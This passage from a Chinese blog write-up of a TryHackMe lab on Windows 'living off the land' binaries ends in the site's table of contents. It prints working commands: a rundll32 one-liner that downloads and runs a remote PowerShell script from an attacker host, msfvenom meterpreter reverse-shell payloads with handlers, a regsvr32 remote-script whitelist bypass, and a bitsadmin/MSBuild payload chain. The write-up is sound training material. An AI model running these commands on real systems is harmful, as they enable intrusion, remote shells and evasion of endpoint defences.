<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">wmic.exe process</span><span style="color: #C678DD"> call </span><span style="color: #ABB2BF">create calc</span></span></code></pre></div></div></figure>
<h3 id="Rundll32">Rundll32</h3>
<p>Rundll32 是微软内置的工具，用于在操作系统内加载并运行动态链接库（DLL）文件。红队可以滥用并利用 rundll32.exe 来运行任意 payload 并执行 JavaScript 与 PowerShell 脚本。MITRE ATT&amp;CK 框架将此识别为<strong>签名二进制代理执行：Rundll32</strong>，并将其标识为 <a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1218/011/">T1218</a>。</p>
<p>rundll32.exe 二进制文件位于：</p>
<ul>
<li>C:\Windows\System32\rundll32.exe for the Windows 64-bit version.</li>
<li>C:\Windows\SysWOW64\rundll32.exe for the Windows 32-bit version.</li>
</ul>
<p>使用包含 JavaScript 组件 eval() 的 <code>rundll32.exe</code> 二进制文件来执行 <code>calc.exe</code>。</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">rundll32.exe javascript:</span><span style="color: #98C379">&quot;\..\mshtml.dll,RunHTMLApplication &quot;</span><span style="color: #ABB2BF">;</span><span style="color: #56B6C2">eval</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;w=new ActiveXObject(\&quot;</span><span style="color: #ABB2BF">WScript.</span><span style="color: #E06C75">Shell</span><span style="color: #ABB2BF">\</span><span style="color: #98C379">&quot;);w.run(\&quot;</span><span style="color: #E06C75">calc</span><span style="color: #ABB2BF">\</span><span style="color: #98C379">&quot;);window.close()&quot;</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<p>我们也可以使用 <code>rundll32.exe</code> 来执行 PowerShell 脚本。下面的命令运行一个 JavaScript，该脚本通过 <code>rundll32.exe</code> 执行一个 PowerShell 脚本，从远程网站下载内容。</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(&#39;http://AttackBox_IP/script.ps1&#39;);&quot;);</span></span></code></pre></div></div></figure>
<h2 id="应用白名单绕过">应用白名单绕过</h2>
<p>应用白名单是微软终端安全功能，用于实时阻止恶意和未授权程序的执行。应用白名单基于规则，指定允许出现在操作系统上并被执行的已批准应用或可执行文件列表。</p>
<h3 id="Regsvr32">Regsvr32</h3>
<p>Regsvr32 是微软的一个命令行工具，用于在 Windows 注册表中注册和注销动态链接库（DLL）。regsvr.exe 可执行文件位于：</p>
<ul>
<li>C:\Windows\System32\regsvr32.exe for the Windows 32 bits version</li>
<li>C:\Windows\SysWOW64\regsvr32.exe for the Windows 64 bits version</li>
</ul>
<p>除了其预期用途外，<code>regsvr32.exe</code> 二进制文件还可以用于执行任意二进制文件并绕过 Windows 应用白名单。根据 <a target="_blank" rel="noopener" href="https://redcanary.com/">Red Canary</a> 的报告，<code>regsvr32.exe</code> 是第三大流行的 <a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1218/010/">ATT&amp;CK</a> 技术。对手利用 <code>regsvr32.exe</code> 在本地或远程执行本机代码或脚本。<code>regsvr32.exe</code> 使用的技术利用了受信任的 Windows 操作系统组件并在内存中执行，这也是该技术常被用来绕过应用白名单的原因之一。</p>
<p>让我们使用 msvenom 创建一个恶意的 DLL 文件，并设置 Metasploit 监听器以接收反向 shell。我们将创建一个适用于 32 位操作系统的恶意文件。我们将使用 regsvr32.exe 应用白名单绕过技术在目标系统上运行命令。</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/meterpreter/reverse_tcp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LHOST=tun0</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LPORT=</span><span style="color: #D19A66">443</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">dll</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-a</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">x86</span><span style="color: #ABB2BF"> &gt; </span><span style="color: #98C379">live0fftheland.dll</span></span>
<span class="line"></span>
<span class="line"><span style="color: #61AFEF">msfconsole</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-q</span></span>
<span class="line"><span style="color: #61AFEF">use</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">exploit/multi/handler</span><span style="color: #ABB2BF"> </span></span>
<span class="line"><span style="color: #56B6C2">set</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">payload</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/meterpreter/reverse_tcp</span><span style="color: #ABB2BF"> </span></span>
<span class="line"><span style="color: #56B6C2">set</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LHOST</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10.11</span><span style="color: #98C379">.141.2</span></span>
<span class="line"><span style="color: #56B6C2">set</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LPORT</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">443</span><span style="color: #ABB2BF"> </span></span>
<span class="line"><span style="color: #61AFEF">exploit</span></span></code></pre></div></div></figure>
<p>然后传到靶机上，不传也行。</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">c:\</span><span style="color: #E06C75">Windows</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">System32</span><span style="color: #ABB2BF">\regsvr32.exe c:\</span><span style="color: #E06C75">Users</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">thm</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Downloads</span><span style="color: #ABB2BF">\live0fftheland.dll</span></span>
<span class="line"><span style="color: #ABB2BF"># 远程执行</span></span>
<span class="line"><span style="color: #ABB2BF">c:\</span><span style="color: #E06C75">Windows</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">System32</span><span style="color: #ABB2BF">\regsvr32.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">s</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">n</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">u</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">i</span><span style="color: #ABB2BF">:http://example.</span><span style="color: #E06C75">com</span><span style="color: #ABB2BF">/file.sct </span><span style="color: #E06C75">Downloads</span><span style="color: #ABB2BF">\live0fftheland.dll</span></span></code></pre></div></div></figure>
<p>第二个选项，这是一个更高级的命令，我们指示 regsvr32.exe 运行：</p>
<ul>
<li><code>/s</code>：静默模式（不显示消息）</li>
<li><code>/n</code>：不要调用 DLL 注册服务器</li>
<li><code>/i</code>: 因为我们用了 /n，所以改用另一台服务器</li>
<li><code>/u</code>：使用未注册方法运行</li>
</ul>
<p>如果我们想创建一个 64 位的 DLL 版本，需要在 msfvenom 命令中指定，并在受害者机器上使用位于 C:\Windows\SysWOW64\regsvr32.exe 的 64 位 <code>regsvr32.exe</code> 来运行它。</p>
<h3 id="Bourne-Again-Shell-Bash">Bourne Again Shell (Bash)</h3>
<p>在 2016 年，微软为 Windows 10、11 和 Server 2019 增加了对 Linux 环境的支持。此功能称为 Windows 子系统用于 Linux（WSL），并存在两个版本：WSL1 和 WSL2。WSL 是在操作系统上运行的通过 Hyper-V 虚拟化的 Linux 发行版，支持一部分 Linux 内核和系统调用。此功能是用户可以安装并与之交互的附加组件。作为 WSL 的一部分，bash.exe 是用于与该 Linux 环境交互的微软工具。</p>
<p>人们找到了利用该 Microsoft 签名二进制文件来执行 payload 并绕过 Windows 应用程序白名单的方法。通过执行 <code>bash.exe -c &quot;path-to-payload&quot;</code>，我们可以执行任何未签名的 payload。ATT&amp;CK 将这称为间接命令执行（Indirect Command execution）技术，攻击者滥用 Windows 工具实用程序以获取命令执行。有关此技术的更多信息，您可以访问 <a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1202/">T1202</a> ATT&amp;CK 网站。</p>
<p>需要在 Windows 10 中启用并安装 Windows 子系统以使用 <code>bash.exe</code> 二进制文件。此外，附带的虚拟机由于嵌套虚拟化限制未启用该 Linux 子系统。</p>
<h2 id="其他技术">其他技术</h2>
<p>本节提了几种有趣的技术，可用于初始访问或保活。</p>
<h3 id="Shortcuts-快捷方式">Shortcuts 快捷方式</h3>
<p>当用户点击快捷方式文件时，被引用的文件或应用程序会被执行。红队经常利用此技术来获得初始访问权限、提升权限或实现持久性。MITRE ATT&amp;CK 框架将此快捷方式修改技术称为 <a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1547/009/">T1547</a>，攻击者通过创建或修改快捷方式来利用该技术。</p>
<p>要使用快捷方式修改技术，我们可以将目标部分设置为使用以下命令来执行文件：</p>
<ul>
<li>Rundll32</li>
<li>Powershell</li>
<li>Regsvr32</li>
<li>硬盘上的可执行文件</li>
</ul>
<p>房间里给的 demo 是我们之前用 <code>rundll32.exe</code> 执行计算器的，我们要复现直接把之前的那条命令粘贴到目标里面的</p>
<p>这里有几个快捷方式修改的 demo：<a target="_blank" rel="noopener" href="https://github.com/theonlykernel/atomic-red-team/blob/master/atomics/T1023/T1023.md">https://github.com/theonlykernel/atomic-red-team/blob/master/atomics/T1023/T1023.md</a></p>
<h3 id="No-PowerShell">No PowerShell!</h3>
<p>2019 年，Red Canary 发布了一份威胁检测报告，指出 PowerShell 是用于恶意活动的最常见技术。因此，各组织开始监控或阻止 powershell.exe 的执行。结果，对手开始寻找在不直接启动 powershell.exe 的情况下运行 PowerShell 代码的其他方法。</p>
<p>PowerLessShell 是一个基于 Python 的工具，用于生成在目标机器上运行的恶意代码，同时不会显示 PowerShell 进程的实例。PowerLessShell 依赖滥用 Microsoft Build Engine (MSBuild) —— 一个用于构建 Windows 应用程序的平台 —— 来执行远程代码。</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 下载项目文件</span></span>
<span class="line"><span style="color: #61AFEF">git</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">clone</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">https://github.com/Mr-Un1k0d3r/PowerLessShell.git</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 生成一个 PowerShell payload</span></span>
<span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/meterpreter/reverse_winhttps</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LHOST=</span><span style="color: #D19A66">10.11</span><span style="color: #98C379">.141.2</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LPORT=</span><span style="color: #D19A66">4443</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">psh-reflection</span><span style="color: #ABB2BF"> &gt; </span><span style="color: #98C379">liv0ff.ps1</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 启动好 MSF handler</span></span>
<span class="line"><span style="color: #61AFEF">msfconsole</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-q</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-x</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost 10.11.141.2;set lport 4443;exploit&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 生成 csproj 文件</span></span>
<span class="line"><span style="color: #61AFEF">python2</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">PowerLessShell.py</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-type</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">powershell</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-source</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/tmp/liv0ff.ps1</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-output</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">liv0ff.csproj</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 下载文件</span></span>
<span class="line"><span style="color: #61AFEF">bitsadmin.exe</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/transfer</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/Download</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/priority</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Foreground</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">http://10.6.4.118/liv0ff.csproj</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">c:</span><span style="color: #56B6C2">\U</span><span style="color: #98C379">sers</span><span style="color: #56B6C2">\t</span><span style="color: #98C379">hm</span><span style="color: #56B6C2">\D</span><span style="color: #98C379">esktop</span><span style="color: #56B6C2">\l</span><span style="color: #98C379">iv0ff.csproj</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 目标机器上编译就执行了</span></span>
<span class="line"><span style="color: #61AFEF">c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">c:</span><span style="color: #56B6C2">\U</span><span style="color: #98C379">sers</span><span style="color: #56B6C2">\t</span><span style="color: #98C379">hm</span><span style="color: #56B6C2">\D</span><span style="color: #98C379">esktop</span><span style="color: #56B6C2">\l</span><span style="color: #98C379">iv0ff.csproj</span></span></code></pre></div></div></figure>
<p>我跑起来了，拿到 flag，但是攻击机上没有 shell 回连，不知道啥情况。</p>
<h2 id="现实场景">现实场景</h2>
<p>2017 年，Windows Defender 高级威胁防护（<a target="_blank" rel="noopener" href="https://www.microsoft.com/security/blog/2018/11/15/whats-new-in-windows-defender-atp/">Windows Defender ATP</a>）研究团队发现了一种名为 Astaroth 的无文件恶意软件。无文件恶意软件指的是在系统中运行并执行但不写入磁盘的恶意软件。该恶意软件在受害设备的内存中执行其所有功能。</p>
<p>Astaroth 被认为是一种信息窃取器，会从受害用户处获取敏感信息，例如账户凭据、按键记录和其他数据，并将其发送给攻击者。该恶意软件依赖多种先进技术来执行不同功能，如反调试、反虚拟化、反仿真技巧、进程掏空（process hollowing）、NTFS 备用数据流（ADS）以及“借用现有系统工具”（Living off the land）二进制文件。</p>
<p>在初始访问阶段，攻击者依赖包含恶意附件文件的垃圾邮件活动。所附文件是一个 LNK 快捷方式文件，一旦受害者点击它，将导致以下情况：</p>
<ul>
<li>执行了一个 WMIC 命令以下载并运行 Javascript 代码。</li>
<li>滥用 BITSadmin 从指挥控制服务器下载多个二进制文件。有趣的是，在某些情况下，恶意软件会使用 YouTube 频道描述来隐藏它们的 C2 服务器命令。</li>
<li>使用 BITSadmin、ADS 技术，将其二进制文件隐藏在系统内以实现持久性。</li>
<li>使用 Certutil 工具将几个下载的有效载荷解码为 DLL 文件。</li>
<li>这些 DLL 文件使用 Regsvr32 执行。</li>
</ul>
<p>有关该恶意软件及其检测的更多详细信息，建议查阅以下参考资料：</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://www.armor.com/resources/threat-intelligence/astaroth-banking-trojan/">Astaroth: Banking Trojan</a></li>
<li><a target="_blank" rel="noopener" href="https://www.trendmicro.com/vinfo/de/security/news/cybercrime-and-digital-threats/microsoft-discovers-fileless-malware-campaign-dropping-astaroth-info-stealer">Microsoft Discovers Fileless Malware Campaign Dropping Astaroth Info Stealer</a></li>
<li><a target="_blank" rel="noopener" href="https://www.zdnet.com/article/astaroth-malware-hides-command-servers-in-youtube-channel-descriptions/">Astaroth malware hides command servers in YouTube channel descriptions</a></li>
</ol>
<h2 id="总结-2">总结</h2>
<p>在本房间中，我们介绍了“就地取材”（Living Off the Land）的一般概念，并回顾了一些在红队演练中见到和使用的示例。就地取材技术可用于多种目的，包括侦察、文件操作、执行二进制文件，以及实现持久化和绕过安全措施。</p>
<h3 id="其他资源">其他资源</h3>
<ul>
<li><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a> - The Linux version of the LOLBAS project.</li>
<li><a target="_blank" rel="noopener" href="https://www.armor.com/resources/threat-intelligence/astaroth-banking-trojan/">Astaroth: Banking Trojan</a> - A real-life malware analysis where they showcase using the Living Off the Land technique used by Malware.</li>
</ul>

    
  </article>

  
      
    <div class="nexmoe-post-copyright">
        <strong>本文作者：</strong>Recopec<br>
        <strong>本文链接：</strong><a href="https://blog.irec.moe/thm_rthe.html" title="https:&#x2F;&#x2F;blog.irec.moe&#x2F;thm_rthe.html" target="_blank" rel="noopener">https:&#x2F;&#x2F;blog.irec.moe&#x2F;thm_rthe.html</a><br>
        
            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可

        
    </div>


  
  
  <div class="nexmoe-post-meta nexmoe-rainbow">
   
    
        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/C/" rel="tag">C#</a> <a class="nexmoefont icon-tag-fill -none-link" href="/tags/Windows/" rel="tag">Windows</a>
    
</div>
  
  
    <script async src="/js/copy-codeblock.js?v=1758368662283"></script>
  

  
      <div class="nexmoe-post-footer">
          <script src="https://giscus.app/client.js"
      data-repo="Recopec/Recopec.github.io"
      data-repo-id="R_kgDOHWxLSA"
      data-category="Announcements"
      data-category-id="DIC_kwDOHWxLSM4CYhGk"
      data-mapping="title"
      data-strict="0"
      data-reactions-enabled="1"
      data-emit-metadata="0"
      data-input-position="top"
      data-theme="preferred_color_scheme"
      data-lang="zh-CN"
      data-loading="lazy"
      crossorigin="anonymous"
      async>
</script>

      </div>
  
</div></div><div class="nexmoe-post-right">    <div class="nexmoe-fixed">
        <div class="nexmoe-tool">

            

            
            
            <button class="mdui-fab catalog" style="overflow:unset;">
                <i class="nexmoefont icon-i-catalog"></i>
                <div class="nexmoe-toc">
                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">Windows Internals</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Process"><span class="toc-number">1.1.</span> <span class="toc-text">Process</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Threads"><span class="toc-number">1.2.</span> <span class="toc-text">Threads</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Virtual-memory"><span class="toc-number">1.3.</span> <span class="toc-text">Virtual memory</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dynamic-Link-Libraries"><span class="toc-number">1.4.</span> <span class="toc-text">Dynamic Link Libraries</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DWORD-ul-reason-for-call"><span class="toc-number">1.4.1.</span> <span class="toc-text">DWORD ul_reason_for_call</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD-DLL"><span class="toc-number">1.4.2.</span> <span class="toc-text">加载 DLL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E6%97%B6%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5-load-time-dynamic-linking"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">加载时动态链接 load-time dynamic linking</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E6%97%B6%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5-run-time-dynamic-linking"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">运行时动态链接 run-time dynamic linking</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Portable-Executable-Format"><span class="toc-number">1.5.</span> <span class="toc-text">Portable Executable Format</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Interacting-with-Windows-Internals"><span class="toc-number">1.6.</span> <span class="toc-text">Interacting with Windows Internals</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%BC%B9%E7%AA%97%E5%88%B0%E8%BF%9B%E7%A8%8B%E4%B8%AD"><span class="toc-number">1.6.1.</span> <span class="toc-text">注入弹窗到进程中</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">Introduction to Windows API</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-API-%E7%9A%84%E7%BB%84%E6%88%90%E9%83%A8%E5%88%86"><span class="toc-number">2.1.</span> <span class="toc-text">Windows API 的组成部分</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OS-Libraries-%E7%B3%BB%E7%BB%9F%E5%BA%93"><span class="toc-number">2.2.</span> <span class="toc-text">OS Libraries 系统库</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-Header-File-%E5%A4%B4%E6%96%87%E4%BB%B6"><span class="toc-number">2.2.1.</span> <span class="toc-text">Windows Header File 头文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#P-Invoke-%E6%9C%BA%E5%88%B6%E5%92%8C%E6%89%98%E7%AE%A1%E4%BB%A3%E7%A0%81"><span class="toc-number">2.2.2.</span> <span class="toc-text">P&#x2F;Invoke 机制和托管代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#API-Call-Structure-API-%E8%B0%83%E7%94%A8%E7%BB%93%E6%9E%84"><span class="toc-number">2.3.</span> <span class="toc-text">API Call Structure API 调用结构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%84%E5%8A%A0%E5%AD%97%E7%AC%A6"><span class="toc-number">2.3.1.</span> <span class="toc-text">附加字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E7%AD%BE%E5%90%8D"><span class="toc-number">2.3.2.</span> <span class="toc-text">方法签名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#API-Implementations-API-%E5%AE%9E%E7%8E%B0"><span class="toc-number">2.4.</span> <span class="toc-text">API Implementations API 实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#API-%E5%AE%9E%E7%8E%B0%E5%9C%A8-C-%E4%B8%AD"><span class="toc-number">2.4.1.</span> <span class="toc-text">API 实现在 C 中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#API-%E5%AE%9E%E7%8E%B0%E5%9C%A8-NET-and-PowerShell-%E4%B8%AD"><span class="toc-number">2.4.2.</span> <span class="toc-text">API 实现在 .NET and PowerShell 中</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E6%BB%A5%E7%94%A8-API"><span class="toc-number">2.5.</span> <span class="toc-text">常用滥用 API</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B%E5%AD%A6%E4%B9%A0"><span class="toc-number">2.6.</span> <span class="toc-text">案例学习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8"><span class="toc-number">2.6.1.</span> <span class="toc-text">键盘记录器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8-Demo"><span class="toc-number">2.6.1.1.</span> <span class="toc-text">键盘记录器 Demo</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shellcode-Launcher"><span class="toc-number">2.6.2.</span> <span class="toc-text">Shellcode Launcher</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">Abusing Windows Internals</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Abusing-Processes-%E6%BB%A5%E7%94%A8%E8%BF%9B%E7%A8%8B"><span class="toc-number">3.1.</span> <span class="toc-text">Abusing Processes 滥用进程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98"><span class="toc-number">3.1.1.</span> <span class="toc-text">远程代码注入实战</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Process-Hollowing-%E8%BF%9B%E7%A8%8B%E6%8C%96%E7%A9%BA"><span class="toc-number">3.2.</span> <span class="toc-text">Process Hollowing 进程挖空</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E5%88%9B%E5%BB%BA%E6%8C%82%E8%B5%B7%E8%BF%9B%E7%A8%8B"><span class="toc-number">3.2.0.1.</span> <span class="toc-text">第一步：创建挂起进程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E8%AF%BB%E5%8F%96%E6%81%B6%E6%84%8F%E9%95%9C%E5%83%8F%E5%88%B0%E6%9C%AC%E5%9C%B0%E5%86%85%E5%AD%98"><span class="toc-number">3.2.0.2.</span> <span class="toc-text">第二步：读取恶意镜像到本地内存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E6%8E%8F%E7%A9%BA%E7%9B%AE%E6%A0%87%E8%BF%9B%E7%A8%8B"><span class="toc-number">3.2.0.3.</span> <span class="toc-text">第三步：掏空目标进程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E9%87%8D%E6%96%B0%E5%88%86%E9%85%8D%E5%B9%B6%E5%86%99%E5%85%A5%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81"><span class="toc-number">3.2.0.4.</span> <span class="toc-text">第四步：重新分配并写入恶意代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E4%BF%AE%E6%94%B9%E4%B8%8A%E4%B8%8B%E6%96%87%E5%B9%B6%E6%81%A2%E5%A4%8D%E7%BA%BF%E7%A8%8B"><span class="toc-number">3.2.0.5.</span> <span class="toc-text">第五步：修改上下文并恢复线程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-number">3.2.1.</span> <span class="toc-text">实战</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Thread-Hijacking-%E7%BA%BF%E7%A8%8B%E5%8A%AB%E6%8C%81"><span class="toc-number">3.3.</span> <span class="toc-text">Thread Hijacking 线程劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98-2"><span class="toc-number">3.3.1.</span> <span class="toc-text">实战</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Abusing-DLLs-%E6%BB%A5%E7%94%A8-DLL"><span class="toc-number">3.4.</span> <span class="toc-text">Abusing DLLs 滥用 DLL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5"><span class="toc-number">3.4.1.</span> <span class="toc-text">实践</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Memory-Execution-Alternatives-%E5%86%85%E5%AD%98%E6%89%A7%E8%A1%8C%E6%9B%BF%E4%BB%A3"><span class="toc-number">3.5.</span> <span class="toc-text">Memory Execution Alternatives 内存执行替代</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Invoking-Function-Pointers-%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88"><span class="toc-number">3.5.1.</span> <span class="toc-text">Invoking Function Pointers 调用函数指针</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 